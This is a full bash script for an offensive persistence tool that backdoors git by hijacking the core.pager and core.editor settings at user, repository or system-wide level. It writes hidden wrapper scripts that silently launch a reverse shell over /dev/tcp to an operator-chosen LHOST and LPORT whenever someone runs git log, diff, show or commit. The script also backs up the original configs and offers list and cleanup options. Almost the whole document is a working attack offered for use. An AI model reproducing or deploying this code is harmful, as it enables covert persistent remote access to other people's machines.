#!/bin/bash
# Git Config Pager/Editor Backdoor (T1546)
# Hijacks git config pager/editor directives to execute payload on common git commands

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_gitcfg"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║      Git Config Pager/Editor Backdoor (T1546)        ║"
    echo " ║  Fires on: git log, git diff, git show, git commit   ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

install_gitconfig() {
    local TARGET_USER="$1" PAYLOAD="$2" HOOK_TYPE="$3"
    local HD; HD=$(getent passwd "$TARGET_USER" 2>/dev/null | cut -d: -f6)
    [ -z "$HD" ] && { echo -e "${RED}[-] User not found: ${TARGET_USER}${NC}"; return; }

    local GITCFG="${HD}/.gitconfig"
    local WRAPPER="${HD}/.local/share/.git-helper"

    mkdir -p "$(dirname "$WRAPPER")"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexec "${PAGER:-less}" "$@" 2>/dev/null\n' \
        "$MARKER" "$PAYLOAD" > "$WRAPPER"
    chmod 755 "$WRAPPER"
    chown "${TARGET_USER}:" "$WRAPPER" 2>/dev/null

    # Backup existing config
    [ -f "$GITCFG" ] && ! grep -q "$MARKER" "$GITCFG" && \
        cp "$GITCFG" "${GITCFG}.d3m0n.bak"

    case "$HOOK_TYPE" in
        pager)
            git config --file "$GITCFG" core.pager "$WRAPPER" 2>/dev/null || \
                printf "\n# %s\n[core]\n\tpager = %s\n" "$MARKER" "$WRAPPER" >> "$GITCFG"
            echo -e "${GREEN}[+] core.pager set → fires on: git log, git diff, git show${NC}"
            ;;
        editor)
            git config --file "$GITCFG" core.editor "$WRAPPER" 2>/dev/null || \
                printf "\n# %s\n[core]\n\teditor = %s\n" "$MARKER" "$WRAPPER" >> "$GITCFG"
            echo -e "${GREEN}[+] core.editor set → fires on: git commit, git rebase, git tag${NC}"
            ;;
        both)
            git config --file "$GITCFG" core.pager "$WRAPPER" 2>/dev/null || \
                printf "\n# %s\n[core]\n\tpager = %s\n" "$MARKER" "$WRAPPER" >> "$GITCFG"
            git config --file "$GITCFG" core.editor "$WRAPPER" 2>/dev/null || \
                printf "\n\teditor = %s\n" "$WRAPPER" >> "$GITCFG"
            echo -e "${GREEN}[+] Both core.pager and core.editor set${NC}"
            ;;
    esac

    chown "${TARGET_USER}:" "$GITCFG" 2>/dev/null
    echo -e "${GREEN}[+] Installed for user: ${TARGET_USER}${NC}"
    echo -e "${YELLOW}[!] Wrapper: ${WRAPPER}${NC}"
}

install_repo_level() {
    local REPO_PATH="$1" PAYLOAD="$2"
    local GITCFG="${REPO_PATH}/.git/config"
    [ -f "$GITCFG" ] || { echo -e "${RED}[-] Not a git repo: ${REPO_PATH}${NC}"; return; }

    local WRAPPER="${REPO_PATH}/.git/hooks/.pager-helper"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexec "${PAGER:-less}" "$@" 2>/dev/null\n' \
        "$MARKER" "$PAYLOAD" > "$WRAPPER"
    chmod 755 "$WRAPPER"

    git config --file "$GITCFG" core.pager "$WRAPPER" 2>/dev/null || \
        printf "\n# %s\n[core]\n\tpager = %s\n" "$MARKER" "$WRAPPER" >> "$GITCFG"

    echo -e "${GREEN}[+] Repo-level pager set: ${REPO_PATH}${NC}"
    echo -e "${YELLOW}[!] Fires when anyone runs git log/diff in this repo${NC}"
}

install_system_level() {
    local PAYLOAD="$1"
    local WRAPPER="/usr/local/bin/.git-pager"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexec "${PAGER:-less}" "$@" 2>/dev/null\n' \
        "$MARKER" "$PAYLOAD" > "$WRAPPER"
    chmod 755 "$WRAPPER"

    # System-wide gitconfig
    local SYSCFG="/etc/gitconfig"
    [ -f "$SYSCFG" ] && cp "$SYSCFG" "${SYSCFG}.d3m0n.bak"
    git config --system core.pager "$WRAPPER" 2>/dev/null || \
        printf "# %s\n[core]\n\tpager = %s\n" "$MARKER" "$WRAPPER" >> "$SYSCFG"

    echo -e "${GREEN}[+] System-wide git pager set (fires for ALL users)${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] ~/.gitconfig backdoors:${NC}"
    grep -rl "$MARKER" /home/ /root/ 2>/dev/null | grep -v '\.d3m0n\.bak' | while read -r f; do
        echo "  $f"
    done
    echo -e "${YELLOW}[*] System gitconfig:${NC}"
    grep -l "$MARKER" /etc/gitconfig 2>/dev/null | while read -r f; do echo "  $f"; done
    echo -e "${YELLOW}[*] Wrappers:${NC}"
    find /home/ /root/ /usr/local/bin -name '.git-*' -o -name '.pager-helper' 2>/dev/null | while read -r f; do
        grep -q "$MARKER" "$f" 2>/dev/null && echo "  $f"
    done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    # Remove wrappers
    find /home/ /root/ /usr/local/bin -name '.git-*' -o -name '.pager-helper' 2>/dev/null | while read -r f; do
        grep -q "$MARKER" "$f" 2>/dev/null && rm -f "$f"
    done
    # Restore gitconfig backups
    find /home/ /root/ /etc -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do
        mv "$f" "${f%.d3m0n.bak}"
    done
    # Remove system-level if no backup
    [ -f /etc/gitconfig ] && grep -q "$MARKER" /etc/gitconfig && \
        sed -i "/${MARKER}/d" /etc/gitconfig && \
        git config --system --unset core.pager 2>/dev/null
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner

echo -e "  ${YELLOW}[1]${NC} User ~/.gitconfig (pager)   — git log, git diff, git show"
echo -e "  ${YELLOW}[2]${NC} User ~/.gitconfig (editor)  — git commit, git rebase"
echo -e "  ${YELLOW}[3]${NC} User ~/.gitconfig (both)"
echo -e "  ${YELLOW}[4]${NC} Repo-level .git/config"
echo -e "  ${YELLOW}[5]${NC} System-wide /etc/gitconfig (all users)"
echo -e "  ${YELLOW}[6]${NC} List installed"
echo -e "  ${YELLOW}[7]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1|2|3)
        read -rp "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        HTYPE=pager; [ "$OPT" = "2" ] && HTYPE=editor; [ "$OPT" = "3" ] && HTYPE=both
        install_gitconfig "$USR" "$PAYLOAD" "$HTYPE"
        ;;
    4)
        read -rp "Repo path [.]: " REPO; REPO="${REPO:-.}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        install_repo_level "$REPO" "$PAYLOAD"
        ;;
    5)
        [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        install_system_level "$PAYLOAD"
        ;;
    6) list_installed ;;
    7) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
